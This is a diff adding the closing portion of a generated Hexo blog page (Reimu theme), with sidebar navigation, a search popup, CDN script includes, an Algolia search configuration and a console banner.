+    <div class=icon-github>
+      <a href=https://github.com/Ycx6666 itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    <div class="site-search">
+      <div class="reimu-popup popup">
+        <div class="reimu-search">
+          <span class="reimu-search-input-icon"></span>
+          <div class="reimu-search-input" id="reimu-search-input"></div>
+        </div>
+        <div class="reimu-results">
+          <div id="reimu-stats"></div>
+          <div id="reimu-hits"></div>
+          <div id="reimu-pagination" class="reimu-pagination"></div>
+        </div>
+        <span class="popup-btn-close"></span>
+      </div>
+    </div>
+    
+<script src="https://npm.webcache.cn/jquery@3.7.1/dist/jquery.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="/js/generator_search.js"></script>
+
+  
+<script src="https://npm.webcache.cn/instantsearch.js@4.56.1/dist/instantsearch.production.min.js"></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"></script>
+
+  
+<script src="https://npm.webcache.cn/instantsearch.js@4.56.1/dist/instantsearch.production.min.js"></script>
+
+  
+<script src="/js/algolia_search.js"></script>
+
+  <script>
+    var CONFIG = {
+      root: '/',
+      algolia: {
+        applicationID: "",
+        apiKey: "ac97a6a139ee23819efc64577e213254",
+        indexName: "hexo",
+        hits: {
+          "per_page": parseInt("4")
+        },
+        labels: {
+          "input_placeholder": "搜索.....",
+          "hits_empty": "未发现与 「${query}」相关内容",
+          "hits_stats": "找到${hits}条结果(用时 ${time} ms)"
+        }
+      }
+    };
+  </script>
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    firework(JSON.parse('{"excludeElements":["a"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.1.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
